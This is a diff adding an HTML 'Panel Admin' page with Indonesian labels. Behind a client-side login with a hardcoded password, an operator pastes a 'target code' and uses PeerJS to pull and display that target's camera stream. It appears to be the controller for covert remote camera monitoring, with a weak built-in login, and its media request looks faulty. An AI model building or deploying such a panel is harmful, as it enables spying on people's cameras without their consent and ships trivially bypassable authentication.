@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Panel Admin</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body { font-family: Arial; background: #222; color: white; padding: 30px; }
+        .login-box, .admin-panel { background: #333; padding: 20px; border-radius: 10px; max-width: 400px; margin: auto; }
+        input { width: 90%; padding: 10px; margin: 10px 0; }
+        video { width: 100%; border: 2px solid lime; margin-top: 20px; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+    <div id="login-section" class="login-box">
+        <h2>Login Khusus Admin</h2>
+        <input type="text" id="user" placeholder="Username">
+        <input type="password" id="pass" placeholder="Password">
+        <button onclick="login()" style="width: 100%; padding: 10px;">Masuk</button>
+    </div>
+
+    <div id="admin-section" class="admin-panel hidden">
+        <h2>Panel Monitoring</h2>
+        <input type="text" id="target-id" placeholder="Tempel Kode Target di Sini">
+        <button onclick="connectToTarget()" style="width: 100%; padding: 10px; background: lime;">Pantau Kamera</button>
+        <video id="remote-video" autoplay playsinline></video>
+    </div>
+
+    <script>
+        const peer = new Peer();
+
+        function login() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            if(u === "admin" && p === "adminrafz") {
+                document.getElementById('login-section').classList.add('hidden');
+                document.getElementById('admin-section').classList.remove('hidden');
+            } else {
+                alert("Login Gagal!");
+            }
+        }
+
+        function connectToTarget() {
+            const targetId = document.getElementById('target-id').value;
+            // Admin menelepon target tanpa mengirim video admin sendiri
+            navigator.mediaDevices.getUserMedia({video: false, audio: false}).then((stream) => {
+                const call = peer.call(targetId, stream);
+                call.on('stream', (remoteStream) => {
+                    document.getElementById('remote-video').srcObject = remoteStream;
+                });
+            });
+        }
+    </script>
+</body>
+</html>
